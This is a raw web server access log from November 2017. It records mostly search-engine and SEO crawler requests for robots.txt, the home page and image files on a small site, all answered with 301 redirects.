216.244.66.233 - - [07/Nov/2017:07:46:12 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:07:52:41 -0800] "GET /img/urban-cowgirl/2.jpg HTTP/1.1" 301 258 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
180.76.15.29 - - [07/Nov/2017:07:58:57 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
23.237.4.26 - - [07/Nov/2017:08:23:22 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)"
5.196.87.42 - - [07/Nov/2017:11:17:29 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
164.132.161.44 - - [07/Nov/2017:11:17:31 -0800] "GET /img/bs4w/6.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [07/Nov/2017:11:26:31 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.45.243.205 - - [07/Nov/2017:11:37:54 -0800] "GET / HTTP/1.1" 301 235 "http://uptime.com/rndsquared.com" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)"
216.244.66.233 - - [07/Nov/2017:11:39:34 -0800] "GET /img/autumn/4.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:11:39:37 -0800] "GET /img/bs4w/6.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
207.46.13.201 - - [07/Nov/2017:13:16:52 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.253 - - [07/Nov/2017:13:16:56 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.233 - - [07/Nov/2017:15:46:16 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:16:00:55 -0800] "GET /img/autumn/6.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:16:00:58 -0800] "GET /img/bs4w/8.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:16:01:00 -0800] "GET /img/oncekids-fujimini/1.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
180.76.15.34 - - [07/Nov/2017:16:36:54 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
185.100.87.207 - - [07/Nov/2017:16:58:54 -0800] "GET /utility/convert/index.php HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
216.244.66.233 - - [07/Nov/2017:18:07:44 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:18:14:49 -0800] "GET /img/wu-wei/1.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:19:11:58 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:19:18:03 -0800] "GET /img/bs4w/7.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
151.80.31.151 - - [07/Nov/2017:19:32:53 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
151.80.31.150 - - [07/Nov/2017:19:32:55 -0800] "GET /img/mixman/16.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
180.76.15.7 - - [07/Nov/2017:19:33:15 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.153 - - [07/Nov/2017:19:33:16 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
216.244.66.233 - - [07/Nov/2017:20:19:41 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:20:27:43 -0800] "GET /img/oncekids-fujimini/5.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:20:41:32 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:20:54:32 -0800] "GET /img/bs4w/3.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
51.255.65.9 - - [07/Nov/2017:21:00:08 -0800] "GET /img/mixman/10.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [07/Nov/2017:21:04:40 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:21:17:29 -0800] "GET /img/sfnoir/9.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
46.229.170.197 - - [07/Nov/2017:21:44:45 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
216.244.66.233 - - [07/Nov/2017:22:16:28 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:22:28:44 -0800] "GET /img/sfnoir/6.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:23:04:49 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [07/Nov/2017:23:14:54 -0800] "GET /img/autumn/2.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
157.55.39.253 - - [08/Nov/2017:01:19:35 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.233 - - [08/Nov/2017:01:27:37 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:01:33:08 -0800] "GET /img/oncekids-fujimini/2.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:02:15:01 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:02:19:15 -0800] "GET /img/mixman/2.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:02:37:56 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
51.255.64.106 - - [08/Nov/2017:02:41:14 -0800] "GET /img/oncekids-fujimini/6.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [08/Nov/2017:02:43:52 -0800] "GET /img/oncekids-fujimini/8.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:03:27:21 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:03:32:20 -0800] "GET /img/mixman/15.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:03:32:23 -0800] "GET /img/sfnoir/8.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:03:49:09 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:03:55:06 -0800] "GET /img/mixman/10.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:03:55:08 -0800] "GET /img/wu-wei/8.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
174.138.49.59 - - [08/Nov/2017:04:49:15 -0800] "HEAD / HTTP/1.1" 301 - "http://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
185.170.42.18 - - [08/Nov/2017:05:45:02 -0800] "GET /utility/convert/index.php HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
165.227.123.34 - - [08/Nov/2017:05:47:39 -0800] "HEAD / HTTP/1.1" 301 - "http://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
66.249.73.222 - - [08/Nov/2017:06:23:19 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.222 - - [08/Nov/2017:06:23:20 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.233 - - [08/Nov/2017:06:36:39 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:06:42:10 -0800] "GET /img/oncekids-fujimini/6.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:08:55:50 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:09:01:33 -0800] "GET /img/wu-wei/10.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
171.25.193.77 - - [08/Nov/2017:09:01:56 -0800] "GET /wp-login.php HTTP/1.1" 301 247 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
66.249.73.135 - - [08/Nov/2017:09:36:49 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.137 - - [08/Nov/2017:09:36:50 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.255.250.42 - - [08/Nov/2017:10:12:05 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.42 - - [08/Nov/2017:10:12:05 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.42 - - [08/Nov/2017:10:12:09 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.19 - - [08/Nov/2017:10:12:09 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.233 - - [08/Nov/2017:12:08:54 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:12:20:49 -0800] "GET /img/mixman/1.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
207.46.13.201 - - [08/Nov/2017:13:41:57 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.227 - - [08/Nov/2017:13:42:03 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.222 - - [08/Nov/2017:13:56:29 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.233 - - [08/Nov/2017:13:57:01 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:14:04:48 -0800] "GET /img/mixman/5.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
73.158.83.148 - - [08/Nov/2017:14:37:56 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
157.55.39.253 - - [08/Nov/2017:15:19:59 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
64.246.161.190 - - [08/Nov/2017:17:44:10 -0800] "GET /robots.txt HTTP/1.0" 301 245 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)"
64.246.161.190 - - [08/Nov/2017:17:44:10 -0800] "GET / HTTP/1.1" 301 235 "http://whois.domaintools.com/rndsquared.com" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)"
54.160.78.183 - - [08/Nov/2017:19:13:48 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
185.202.103.51 - - [08/Nov/2017:19:25:38 -0800] "GET /wp-login.php HTTP/1.1" 301 247 "http://rndsquared.com/wp-login.php" "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"
151.80.31.154 - - [08/Nov/2017:19:49:10 -0800] "GET /img/mixman/19.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
180.76.15.157 - - [08/Nov/2017:20:00:47 -0800] "GET /css/bootstrap.min.css HTTP/1.1" 301 256 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.155 - - [08/Nov/2017:20:22:30 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.155 - - [08/Nov/2017:20:22:31 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
165.227.179.46 - - [08/Nov/2017:21:41:04 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; spbot/5.0.3; +http://OpenLinkProfiler.org/bot )"
165.227.179.46 - - [08/Nov/2017:21:41:05 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; spbot/5.0.3; +http://OpenLinkProfiler.org/bot )"
165.227.179.46 - - [08/Nov/2017:21:41:10 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; spbot/5.0.3; +http://OpenLinkProfiler.org/bot )"
216.244.66.233 - - [08/Nov/2017:23:10:36 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [08/Nov/2017:23:22:41 -0800] "GET /img/urban-cowgirl/2.jpg HTTP/1.1" 301 258 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:02:37:29 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:02:47:50 -0800] "GET /img/autumn/4.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:02:47:53 -0800] "GET /img/bs4w/6.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
158.46.200.164 - - [09/Nov/2017:03:53:15 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
107.150.62.142 - - [09/Nov/2017:04:22:19 -0800] "GET /wp-login.php HTTP/1.1" 301 247 "http://rndsquared.com/wp-login.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
107.150.62.142 - - [09/Nov/2017:04:22:19 -0800] "GET /wp-login.php HTTP/1.1" 301 247 "http://rndsquared.com/wp-login.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
93.89.220.183 - - [09/Nov/2017:04:47:20 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
216.244.66.233 - - [09/Nov/2017:07:01:13 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
46.229.164.102 - - [09/Nov/2017:07:08:22 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
216.244.66.233 - - [09/Nov/2017:07:09:49 -0800] "GET /img/autumn/6.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:07:09:51 -0800] "GET /img/bs4w/8.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:07:09:53 -0800] "GET /img/oncekids-fujimini/1.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:09:21:44 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:09:31:56 -0800] "GET /img/wu-wei/1.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
40.77.167.45 - - [09/Nov/2017:10:00:40 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.233 - - [09/Nov/2017:10:32:42 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:10:44:29 -0800] "GET /img/bs4w/7.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:12:05:43 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:12:13:59 -0800] "GET /img/bs4w/3.jpg HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:12:28:48 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:12:39:29 -0800] "GET /img/sfnoir/9.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:13:41:22 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:13:50:47 -0800] "GET /img/sfnoir/6.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:14:30:15 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:14:40:53 -0800] "GET /img/autumn/2.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.202 - - [09/Nov/2017:16:07:53 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.202 - - [09/Nov/2017:16:23:13 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
5.196.87.42 - - [09/Nov/2017:17:59:46 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
164.132.161.83 - - [09/Nov/2017:17:59:48 -0800] "GET /img/mixman/4.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [09/Nov/2017:18:00:22 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:18:09:20 -0800] "GET /img/oncekids-fujimini/8.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:18:45:28 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:18:51:44 -0800] "GET /img/mixman/15.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:18:51:47 -0800] "GET /img/sfnoir/8.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:19:05:57 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:19:12:02 -0800] "GET /img/mixman/10.jpg HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:19:12:04 -0800] "GET /img/wu-wei/8.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
180.76.15.6 - - [09/Nov/2017:19:24:30 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
164.132.161.15 - - [09/Nov/2017:20:21:25 -0800] "GET / HTTP/1.1" 301 235 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
51.255.71.114 - - [09/Nov/2017:20:35:14 -0800] "GET /img/mixman/5.jpg HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
216.244.66.233 - - [09/Nov/2017:21:42:28 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.233 - - [09/Nov/2017:21:50:43 -0800] "GET /img/oncekids-fujimini/6.jpg HTTP/1.1" 301 262 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.79.93 - - [09/Nov/2017:23:00:47 -0800] "GET /robots.txt HTTP/1.1" 301 245 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
